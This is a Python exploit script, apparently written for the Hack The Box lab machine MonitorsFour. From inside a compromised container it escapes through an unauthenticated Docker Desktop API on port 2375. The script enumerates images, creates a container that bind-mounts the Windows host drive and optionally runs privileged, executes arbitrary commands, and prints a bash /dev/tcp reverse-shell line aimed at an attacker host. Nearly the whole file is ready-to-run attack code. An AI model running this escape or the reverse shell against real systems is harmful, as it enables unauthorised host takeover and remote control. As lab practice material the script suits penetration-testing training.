#!/usr/bin/env python3
"""
HTB MonitorsFour — Docker Desktop API exposure -> container escape
Source: monitorsfour.txt   |   Arsenal ref: §11.1

The container can reach the Docker Desktop API at 192.168.65.7:2375. Arsenal §11.1 has
the three curl calls; this adds the pieces that make it reliable: version/image
discovery, container creation with a host bind mount, start, and exec into the result.

Run from inside the foothold container.

Usage:
    ./poc_htb_monitorsfour_docker.py recon
    ./poc_htb_monitorsfour_docker.py escape --image docker_setup-nginx-php:latest \
        --bind /mnt/host/c:/host_root
    ./poc_htb_monitorsfour_docker.py exec <CONTAINER_ID> 'dir C:\\'

Note: the bind source is the Windows host path as published by Docker Desktop
(/mnt/host/c in current builds; /host_mnt/c on older ones — `recon` reports which
mounts exist so you can pick the right one).
"""

import argparse
import json
import sys
import urllib.error
import urllib.request

DEFAULT_API = "http://192.168.65.7:2375"


def call(api, path, method="GET", payload=None, timeout=20.0):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(api.rstrip("/") + path, data=data, method=method)
    if data:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read(20000).decode("utf-8", "replace")
            return resp.status, raw
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(4000).decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        return None, "connect failed: %s" % exc.reason


def recon(args):
    for path in ("/version", "/info", "/images/json", "/containers/json"):
        status, body = call(args.api, path, timeout=args.timeout)
        print("===== %s -> %s =====" % (path, status))
        if status == 200 and path.endswith("json"):
            try:
                items = json.loads(body)
            except ValueError:
                print(body[:400])
                continue
            for item in items[:12]:
                if "RepoTags" in item:
                    print("  image: %s" % (item.get("RepoTags") or item.get("Id", "")[:20]))
                else:
                    print("  container: %s %s" % (item.get("Id", "")[:16],
                                                  (item.get("Image") or "")[:40]))
        else:
            print(body[:400])
        print()


def escape(args):
    status, info = call(args.api, "/info", timeout=args.timeout)
    if status != 200:
        print("[-] API not reachable (%s). Is it 192.168.65.7:2375 on this build?" % status)
        return 1

    print("[*] creating container from %s" % args.image)
    spec = {
        "Image": args.image,
        "Cmd": ["/bin/bash", "-c", args.cmd],
        "HostConfig": {"Binds": [args.bind], "Privileged": args.privileged},
    }
    status, body = call(args.api, "/containers/create", "POST", spec, args.timeout)
    print("    create -> %s %s" % (status, body[:300]))
    if status not in (200, 201):
        print("[-] create failed; check the image tag from recon")
        return 1

    try:
        cid = json.loads(body)["Id"]
    except (ValueError, KeyError):
        print("[-] no container Id in response")
        return 1
    print("[+] container %s" % cid[:16])

    status, body = call(args.api, "/containers/%s/start" % cid, "POST", {}, args.timeout)
    print("    start -> %s" % status)
    print("[*] the Cmd runs inside the new container; host files are under %s"
          % args.bind.split(":")[1])
    print("[i] to get an interactive shell instead, use a reverse-shell Cmd:")
    print("    --cmd 'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1'")
    return 0


def execc(args):
    spec = {
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["/bin/sh", "-c", args.command],
    }
    status, body = call(args.api, "/containers/%s/exec" % args.cid, "POST", spec,
                        args.timeout)
    print("exec create -> %s %s" % (status, body[:200]))
    if status not in (200, 201):
        return 1
    exec_id = json.loads(body)["Id"]
    status, body = call(args.api, "/exec/%s/start" % exec_id, "POST",
                        {"Detach": False, "Tty": False}, args.timeout)
    print("exec start -> %s" % status)
    print(body[:2000])
    return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="MonitorsFour Docker API container escape")
    p.add_argument("--api", default=DEFAULT_API)
    p.add_argument("--timeout", type=float, default=20.0)
    sub = p.add_subparsers(dest="action", required=True)

    s = sub.add_parser("recon", help="version/info/images/containers")
    s.set_defaults(func=recon)

    s = sub.add_parser("escape", help="create + start a container with a host bind")
    s.add_argument("--image", default="docker_setup-nginx-php:latest")
    s.add_argument("--bind", default="/mnt/host/c:/host_root")
    s.add_argument("--cmd", default="sleep 3600")
    s.add_argument("--privileged", action="store_true")
    s.set_defaults(func=escape)

    s = sub.add_parser("exec", help="run a command in an existing container")
    s.add_argument("cid")
    s.add_argument("command")
    s.set_defaults(func=execc)

    args = p.parse_args(argv)
    return args.func(args) or 0


if __name__ == "__main__":
    sys.exit(main())
